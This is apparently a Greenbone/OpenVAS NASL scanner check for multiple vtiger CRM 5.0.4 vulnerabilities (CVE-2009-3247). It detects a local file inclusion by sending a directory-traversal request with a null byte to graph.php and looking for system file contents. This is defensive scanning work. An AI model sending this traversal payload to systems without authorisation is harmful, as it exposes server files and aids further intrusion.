CPE = "cpe:/a:vtiger:vtiger_crm";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103109" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-03-07 13:16:38 +0100 (Mon, 07 Mar 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2009-3247" );
	script_bugtraq_id( 36062 );
	script_name( "vtiger CRM Multiple Input Validation Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/36062" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/505834" );
	script_xref( name: "URL", value: "http://www.ush.it/team/ush/hack-vtigercrm_504/vtigercrm_504.txt" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_vtiger_crm_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "vtiger/detected" );
	script_tag( name: "summary", value: "vtiger CRM is prone to multiple input-validation vulnerabilities:

  - A remote PHP code-execution vulnerability

  - Multiple local file-include vulnerabilities

  - A cross-site scripting vulnerability

  - Multiple cross-site request-forgery vulnerabilities" );
	script_tag( name: "impact", value: "Attackers can exploit these issues to execute arbitrary script code
  within the context of the webserver, perform unauthorized actions, compromise the affected application,
  steal cookie-based authentication credentials, or obtain information that could aid in further attacks." );
	script_tag( name: "affected", value: "The issues affect vtiger CRM 5.0.4. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/graph.php?module=" + crap( data: "../", length: 6 * 9 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

